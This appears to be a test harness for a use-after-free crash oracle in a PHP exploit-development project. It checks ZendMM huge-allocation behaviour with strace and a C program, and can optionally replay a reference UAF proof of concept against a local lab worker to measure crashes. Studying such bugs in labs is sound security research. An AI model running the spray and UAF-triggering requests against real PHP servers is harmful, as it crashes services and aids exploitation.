#!/usr/bin/env python3
"""Verify munmap_sigsegv_oracle.py.

Four layers, each independently useful; later layers skip cleanly without docker.

 1. OFFLINE arithmetic + classify self-test (no network, no docker): next_pow2 /
    packed_array_backing_bytes / is_huge / min_elems_for_huge and classify() over
    every category.

 2. LIVE ZendMM munmap differential (docker exec + strace): a huge packed array
    is mmap'd and munmap'd on free (N/N), while a sub-threshold array is NOT
    munmap'd (it stays in the arena). The allocator-level proof.

 3. LIVE OS fault determinism (docker exec + cc). Compiles a program that mmaps
    32 MiB (as zend_mm_alloc_huge does), munmaps it (as zend_mm_free_huge does),
    then reads it: SIGSEGV every run (N/N). The control leaves the region mapped:
    no fault (N/N). Seals "unmapped -> deterministic SIGSEGV" vs "mapped ->
    silent".

 4. LIVE crash-path pairing baseline (optional, --pair-url). Drives a reference
    UAF lab N times and reports the worker-death rate: its stale pointer is a
    ~4 KiB arena chunk (not huge), so it stays silent -- the flaky baseline the
    oracle removes on large/huge UAFs.

Run:
    python3 -I verify_munmap_sigsegv_oracle.py                 # all layers
    python3 -I verify_munmap_sigsegv_oracle.py --skip-net      # layer 1 only
    python3 -I verify_munmap_sigsegv_oracle.py --container php2shell-cli-vuln-1
    python3 -I verify_munmap_sigsegv_oracle.py --pair-url http://127.0.0.1:8102
"""
import argparse
import os
import re
import subprocess
import sys
import tempfile

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import munmap_sigsegv_oracle as O  # noqa: E402

_MUNMAP_RE = re.compile(r"munmap\(0x[0-9a-f]+, (\d+)\)")

# Layer 3 program: models zend_mm_alloc_huge (mmap) + zend_mm_free_huge (munmap).
_FAULT_C = r"""
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
    size_t sz = 33554432;            /* 32 MiB, as array_fill(0,1500000,1) */
    char *p = mmap(NULL, sz, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) { perror("mmap"); return 2; }
    memset(p, 0x41, sz);
    if (argc > 1 && !strcmp(argv[1], "free")) munmap(p, sz);
    volatile char c = p[1234];       /* dangling access after free */
    printf("NO_FAULT read=0x%02x\n", (unsigned char)c);
    return 0;
}
"""


# --- layer 1 -----------------------------------------------------------------
def selftest_arithmetic():
    print("== layer 1: offline arithmetic + classify self-test ==")
    assert O.next_pow2(1) == 1 and O.next_pow2(2) == 2 and O.next_pow2(3) == 4
    assert O.next_pow2(1500000) == 2097152
    assert O.next_pow2(65536) == 65536 and O.next_pow2(65537) == 131072

    # Huge threshold = (512-1)*4096 = 2093056.
    assert O.HUGE_THRESHOLD == 2093056, O.HUGE_THRESHOLD

    # 1.5M packed ints -> 2097152*16 = 33554432 B arData (observed mmap was
    # 33558528 = +1 page of alignment slack; never smaller).
    assert O.packed_array_backing_bytes(1500000) == 33554432
    assert O.is_huge(33554432) and O.array_is_huge(1500000)

    # A 1 MiB array (65536 elems -> 65536*16 = 1048576) is NOT huge.
    assert O.packed_array_backing_bytes(65536) == 1048576
    assert not O.is_huge(1048576) and not O.array_is_huge(65536)

    # Crossing point: 65537 elems -> next_pow2 131072 -> 2097152 B > threshold.
    assert O.min_elems_for_huge() == 65537, O.min_elems_for_huge()
    assert not O.array_is_huge(65536) and O.array_is_huge(65537)
    print("  thresholds: HUGE=%d, min huge-array elems=%d, "
          "array_fill(1.5M)->%d B (huge) OK"
          % (O.HUGE_THRESHOLD, O.min_elems_for_huge(),
             O.packed_array_backing_bytes(1500000)))

    # Spray builders.
    assert "array_fill(0, 1500000, 1)" in O.huge_array_php(1500000)
    try:
        O.huge_array_php(1000)       # too small -> must assert
        raise AssertionError("huge_array_php accepted a non-huge size")
    except AssertionError as e:
        assert "NOT huge" in str(e), e
    ser = O.huge_serialized_array(200000)
    assert ser.startswith("a:200000:{") and ser.endswith("}")
    body, hdrs = O.huge_field_body(3 * 1024 * 1024)
    assert b"x" * 4096 in body and "multipart/form-data" in hdrs["Content-Type"]
    print("  spray builders: huge_array_php / huge_serialized_array / "
          "huge_field_body OK (non-huge sizes rejected)")

    # classify() over every category.
    assert O.classify(True, False)[0] == "segv-dangling"
    assert O.classify(True, True, body=b"post=2 files=1")[0] == "survived-silent"
    assert O.classify(True, True,
                      body=b"Fatal error: Allowed memory size ...")[0] == "soft-oom"
    assert O.classify(False, False)[0] == "precondition"
    print("  classify: segv-dangling / survived-silent / soft-oom / "
          "precondition OK")
    print("  PASS (offline)\n")


# --- docker helpers ----------------------------------------------------------
def _have_docker():
    try:
        subprocess.run(["docker", "version"], capture_output=True, timeout=15)
        return True
    except Exception:                                # noqa: BLE001
        return False


def _container_up(name):
    try:
        cp = subprocess.run(["docker", "inspect", "-f", "{{.State.Running}}", name],
                            capture_output=True, timeout=15, text=True)
        return cp.returncode == 0 and cp.stdout.strip() == "true"
    except Exception:                                # noqa: BLE001
        return False


# --- layer 2 -----------------------------------------------------------------
def _strace_munmaps(container, nelems, timeout=60):
    """Run `array_fill(nelems); unset` under strace in the container; return the
    list of munmap sizes recorded between the FREE and DONE markers."""
    script = ('$a=array_fill(0,%d,1); fwrite(STDERR,"FREE\\n"); '
              'unset($a); fwrite(STDERR,"DONE\\n");' % nelems)
    cp = subprocess.run(
        ["docker", "exec", container, "strace", "-f", "-e", "trace=munmap",
         "php", "-r", script],
        capture_output=True, timeout=timeout, text=True)
    sizes, inwin = [], False
    for line in cp.stderr.splitlines():
        if "FREE" in line:
            inwin = True
            continue
        if "DONE" in line:
            inwin = False
            continue
        if inwin:
            m = _MUNMAP_RE.search(line)
            if m:
                sizes.append(int(m.group(1)))
    return sizes


def live_zendmm_munmap(container, reps=5):
    print("== layer 2: live ZendMM munmap differential (%s, %d reps) =="
          % (container, reps))
    if not _container_up(container):
        print("  SKIP: container %r not running (pass --container)\n" % container)
        return None
    huge_n = O.DEFAULT_ELEMS                          # 1.5M -> ~32 MiB mmap
    small_n = 65536                                   # 1 MiB -> arena, no munmap
    huge_backing = O.packed_array_backing_bytes(huge_n)
    huge_hits = small_hits = 0
    for i in range(reps):
        hs = _strace_munmaps(container, huge_n)
        # A munmap at/above the array backing (allow +2 pages of slack).
        huge_ok = any(huge_backing <= s <= huge_backing + 2 * O.PAGE for s in hs)
        ss = _strace_munmaps(container, small_n)
        small_bad = any(s >= O.HUGE_THRESHOLD for s in ss)
        huge_hits += 1 if huge_ok else 0
        small_hits += 0 if small_bad else 1
        print("  rep %d: huge(%d) munmap>=backing=%s  small(%d) no-huge-munmap=%s"
              % (i + 1, huge_n, huge_ok, small_n, not small_bad))
    det = (huge_hits == reps and small_hits == reps)
    print("  huge munmap'd on free: %d/%d   sub-threshold kept mapped: %d/%d"
          % (huge_hits, reps, small_hits, reps))
    print("  VERDICT: %s\n"
          % ("DETERMINISTIC (huge->munmap, small->arena) as claimed"
             if det else "NOT as claimed - inspect"))
    return det


# --- layer 3 -----------------------------------------------------------------
def live_os_fault(container, reps=5):
    print("== layer 3: live OS fault determinism (mmap/munmap, %s, %d reps) =="
          % (container, reps))
    if not _container_up(container):
        print("  SKIP: container %r not running\n" % container)
        return None
    cc = subprocess.run(["docker", "exec", container, "sh", "-c",
                        "command -v cc || command -v gcc"],
                       capture_output=True, text=True, timeout=15)
    if cc.returncode != 0 or not cc.stdout.strip():
        print("  SKIP: no C compiler in container\n")
        return None
    ccbin = cc.stdout.strip().splitlines()[0]
    # Ship the source in, compile in-container, run control + free.
    with tempfile.NamedTemporaryFile("w", suffix=".c", delete=False) as tf:
        tf.write(_FAULT_C)
        host_c = tf.name
    try:
        subprocess.run(["docker", "cp", host_c, container + ":/tmp/_mf.c"],
                       capture_output=True, timeout=30, check=True)
        b = subprocess.run(["docker", "exec", container, ccbin, "-O0",
                          "/tmp/_mf.c", "-o", "/tmp/_mf"],
                         capture_output=True, timeout=60, text=True)
        if b.returncode != 0:
            print("  SKIP: compile failed: %s\n" % b.stderr.strip()[:200])
            return None
        ctrl_ok = free_segv = 0
        for _ in range(reps):
            r = subprocess.run(["docker", "exec", container, "/tmp/_mf"],
                              capture_output=True, timeout=30)
            ctrl_ok += 1 if r.returncode == 0 else 0
        for _ in range(reps):
            r = subprocess.run(["docker", "exec", container, "/tmp/_mf", "free"],
                              capture_output=True, timeout=30)
            # 139 = 128 + SIGSEGV(11); some setups report -11 / 135(SIGBUS).
            free_segv += 1 if r.returncode in (139, -11, 135, -7) else 0
        print("  region left MAPPED  -> no fault: %d/%d" % (ctrl_ok, reps))
        print("  region MUNMAP'd     -> SIGSEGV : %d/%d" % (free_segv, reps))
        det = (ctrl_ok == reps and free_segv == reps)
        print("  VERDICT: %s\n"
              % ("DETERMINISTIC (unmapped->crash, mapped->silent) as claimed"
                 if det else "NOT as claimed - inspect"))
        return det
    finally:
        try:
            os.unlink(host_c)
        except OSError:
            pass
        subprocess.run(["docker", "exec", container, "rm", "-f",
                        "/tmp/_mf.c", "/tmp/_mf"], capture_output=True, timeout=15)


# --- layer 4 (optional) ------------------------------------------------------
def _a3_once(base, timeout=90):
    """One producer/consumer cycle via the php2shell transport (read-only);
    returns True if the worker survived the second request (silent), False if it
    died."""
    p = O._p
    base = base.rstrip("/")
    p.http("%s/sess.php?blob=0&sid=%s" % (base, p.SID_B), timeout=30)
    s, b = p.http(base + "/unser.php", timeout=120)   # build payload if needed
    p.http(base + "/unser.php", timeout=60)            # R1 producer
    parts = [p.part("PHPSESSID", p.SID_B),
             p.part("PHP_SESSION_UPLOAD_PROGRESS", "k"),
             p.part("victim", b"V" * 1024, filename="victim.bin",
                    ctype="application/octet-stream")]
    body, headers = p.multipart(parts)
    p.http(base + "/poc.php", data=body, headers=headers, timeout=timeout)
    return O.worker_alive(base)


def live_a3_pairing(url, reps=5):
    print("== layer 4: crash-path pairing baseline (poc-a3, %s, %d reps) =="
          % (url, reps))
    if not O._HAVE_PHP2SHELL:
        print("  SKIP: php2shell not importable\n")
        return None
    if not O.worker_alive(url):
        print("  SKIP: worker at %s not answering\n" % url)
        return None
    deaths = 0
    for i in range(reps):
        try:
            alive = _a3_once(url)
        except Exception as e:                       # noqa: BLE001
            print("  rep %d: error %s" % (i + 1, e))
            continue
        deaths += 0 if alive else 1
        print("  rep %d: worker %s after a3 R2"
              % (i + 1, "ALIVE (silent)" if alive else "DEAD (segv)"))
    print("  a3 worker deaths: %d/%d" % (deaths, reps))
    print("  NOTE: a3's dangling pointer is a ~4 KiB arena chunk (not huge), so "
          "it is\n  expected to be SILENT here - this is the flaky baseline the "
          "oracle removes\n  for UAFs whose stale object is large/huge.\n")
    return deaths


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--container", default="php2shell-cli-vuln-1",
                    help="container for the live strace/cc checks (read-only "
                         "exec; default the shared cli-vuln)")
    ap.add_argument("--reps", type=int, default=5)
    ap.add_argument("--pair-url", default=None,
                    help="base URL of a DISPOSABLE a3 lab for layer 4 (it may "
                         "crash the worker); omitted -> layer 4 skipped")
    ap.add_argument("--skip-net", action="store_true",
                    help="run only the offline self-test (layer 1)")
    args = ap.parse_args(argv)

    selftest_arithmetic()
    if args.skip_net:
        print("(--skip-net: skipping live layers)")
        return
    if not _have_docker():
        print("(docker unavailable: skipping live layers 2-4)")
        return
    live_zendmm_munmap(args.container, reps=args.reps)
    live_os_fault(args.container, reps=args.reps)
    if args.pair_url:
        live_a3_pairing(args.pair_url, reps=args.reps)
    else:
        print("(layer 4 skipped: pass --pair-url http://127.0.0.1:8102 to run "
              "the a3 baseline against a disposable lab)")


if __name__ == "__main__":
    main()
